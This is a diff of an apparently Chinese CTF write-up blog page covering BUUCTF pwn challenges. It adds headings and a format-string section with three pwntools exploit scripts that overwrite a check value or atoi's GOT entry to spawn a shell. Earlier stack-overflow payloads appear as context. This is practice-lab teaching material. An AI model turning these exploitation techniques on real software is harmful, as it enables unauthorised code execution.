@@ -5,9 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Buuctf wp, 微凉">
-    <meta name="description" content="
-pwn1
-from pwn import *
+    <meta name="description" content="1.pwn1from pwn import *
 log_level = &#39;debug&#39;
 elf = ELF(&#34;./pwn1&#34;)
 local = 0
@@ -368,7 +366,7 @@ else:
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    397
+                    823
                 </div>
                 
 
@@ -393,9 +391,7 @@ else:
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ol>
-<li><p>pwn1</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+                <h3 id="1-pwn1"><a href="#1-pwn1" class="headerlink" title="1.pwn1"></a>1.pwn1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 log_level = 'debug'
 elf = ELF("./pwn1")
 local = 0
@@ -411,9 +407,11 @@ payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)
 r.sendline(payload)
 
 r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>warmup_csaw_2016</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="2-warmup-csaw-2016"><a href="#2-warmup-csaw-2016" class="headerlink" title="2.warmup_csaw_2016"></a>2.warmup_csaw_2016</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os='linux',arch= 'amd64',log_level='debug')
 elf = ELF("./warmup")
 local = 0
@@ -432,8 +430,7 @@ r.interactive()
 
 
 
-<p>3.cisn_2019_n_1</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+<h3 id="3-cisn-2019-n-1"><a href="#3-cisn-2019-n-1" class="headerlink" title="3.cisn_2019_n_1"></a>3.cisn_2019_n_1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os='linux',arch='amd64',log_level='debug')
 elf=ELF("./ciscn")
 local = 0
@@ -449,8 +446,7 @@ r.interactive()
 
 
 
-<p>4.pwn1_sctf_2016</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+<h3 id="4-pwn1-sctf-201-6"><a href="#4-pwn1-sctf-201-6" class="headerlink" title="4.pwn1_sctf_201  6"></a>4.pwn1_sctf_201  6</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 log_level = 'debug'
 elf = ELF("./pwn1_sctf")
 local = 0
@@ -468,8 +464,7 @@ r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 
 
 
-<p>5.level0</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+<h3 id="5-level0"><a href="#5-level0" class="headerlink" title="5.level0"></a>5.level0</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os = 'linux',arch = 'amd64',log_level = 'debug')
 elf = ELF("./level0")
 local = 0
@@ -489,8 +484,7 @@ r.interactive()
 
 
 
-<p>6.ciscn_2019_c_1</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+<h3 id="6-ciscn-2019-c-1"><a href="#6-ciscn-2019-c-1" class="headerlink" title="6.ciscn_2019_c_1"></a>6.ciscn_2019_c_1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os= 'linux',arch='amd64',log_level='debug')
 elf=ELF("./ciscn_2019")
 local = 0
@@ -555,8 +549,106 @@ r.sendline(payload1)
 
 r.interactive()
 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="7-第五空间2019决赛pwn5"><a href="#7-第五空间2019决赛pwn5" class="headerlink" title="7.第五空间2019决赛pwn5"></a>7.第五空间2019决赛pwn5</h3><ul>
+<li><p><strong>checksec</strong></p>
+<img src="/2022/01/12/buuctf/checksec7.png" alt="image-20220116190256994" style="zoom:80%;"></li>
+<li><p><strong>run</strong></p>
+<img src="/2022/01/12/buuctf/run7.png" alt="image-20220116190432512" style="zoom:80%;">
+
+<p>很明显,输入name时有回显,则可能是栈溢出漏洞和格式化字符串.</p>
+<p>​                                              <img src="/2022/01/12/buuctf/run7(2).png" alt="image-20220116193941078" style="zoom: 80%;"></p>
+<blockquote>
+<p>格式化字符串的利用:</p>
+<p>%x数据以十六进制格式输出</p>
+<p>%p打印地址形式</p>
+<p>%n 是向第x个参数指向的地址写入”已经输出的字符数”</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><p><strong>ida</strong></p>
+<ul>
+<li>疑似溢出点</li>
+</ul>
+<img src="/2022/01/12/buuctf/read7.png" alt="image-20220116191746571" style="zoom:67%;">
+
+<p>​                                               <img src="/2022/01/12/buuctf/buf7.png" alt="image-20220116191930521" style="zoom:67%;"></p>
+<p>​                                                但是size太小,没办法溢出.</p>
+<ul>
+<li><p>发现直接调用system的地方</p>
+<p>​                                         <img src="/2022/01/12/buuctf/system7.png" alt="image-20220116192118923" style="zoom:67%;"></p>
+</li>
+</ul>
+</li>
+</ul>
+<p>​              </p>
+<ul>
+<li><p> <strong>思路</strong></p>
+</li>
+<li><p>思路1:直接利用格式化字符串改写unk_804C044之中的数据.第一个read利用格式化字符串漏洞修改unk_804C044的值,第二个read输入我们修改后的值去满足if判断从而执行system(‘/bin/sh’).</p>
+</li>
+<li><p>思路2:利用格式化字符串改写atoi的got地址,改为system_plt的地址.第一个read利用格式化字符串漏洞修改atoi_got为system_plt,第二个read输入”/bin/sh\x00”,执行system(“/bin/sh”).</p>
+</li>
+<li><p>思路3:unk_804C044是随机生成的,我们可以自己写入一个值,然后在第二个read时再发送这个值.</p>
+</li>
+<li><p><strong>exp</strong></p>
+<ul>
+<li><p>exp1</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">  from pwn import * 
+  context(os = 'linux',arch = 'i386',log_level = 'debug')
+elf = ELF("./pwn")
+  local = 0
+if local:
+      r = process("./pwn")
+else:
+      r = remote("node4.buuoj.cn",27278)
+  unk_addr =  0x0804C044 
+  payload = p32(unk_addr)+b"%10$n"
+r.sendline(payload)
+  r.sendline(str(0x04))#unk_addr = 4byte 
+r.interactive()
+  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>exp2</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+elf = ELF("./pwn")
+local = 0
+if local:
+    r = process("./pwn")
+else:
+    r = remote("node4.buuoj.cn",27278)
+# 0x804c000  0x804d000 rw-p  # unk_804C044  0x0804C044
+system_plt = 0x08049080
+atoi_got = 0x0804C034
+#payload = b'%10$n' + p32(atoi_got)+p32(system_plt)
+payload = fmtstr_payload(10,{atoi_got:system_plt})
+r.sendline(payload)
+r.sendline("/bin/sh\x00")
+r.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>fmtstr_payload()函数</strong></p>
+<p><a href="https://breeze-666.github.io/2022/01/14/noname/">见博客之随笔</a></p>
+</li>
+<li><p>exp3</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import * 
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+elf = ELF("./pwn")
+local = 0
+if local:
+    r = process("./pwn")
+else:
+    r = remote("node4.buuoj.cn",27278)
+unk_addr =  0x0804C044 
+payload = fmtstr_payload(10,{unk_addr:0x1})
+r.sendline(payload)
+r.sendline(str(0x1))
+r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+</ul>
 
                 
             </div>
@@ -1001,7 +1093,7 @@ r.interactive()
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">3.8k</span>
+                        class="white-color">5k</span>
             
             
             
